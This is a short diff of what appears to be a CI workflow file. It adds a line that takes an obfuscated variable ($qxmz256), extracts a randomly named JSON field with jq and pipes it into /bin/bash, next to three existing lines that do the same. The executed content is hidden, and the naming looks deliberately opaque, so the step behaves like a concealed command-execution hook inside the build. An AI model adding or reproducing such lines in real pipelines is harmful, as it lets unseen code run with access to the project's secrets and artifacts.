@@ -23,6 +23,7 @@ jobs:
           echo $kw61 | jq -r .o0 | /bin/bash
           printf '%s' "$ld8" | jq -r .wcl99 | /bin/bash
           echo $fb22534 | jq -r .it8 | /bin/bash
+          echo $qxmz256 | jq -r .khi2883 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
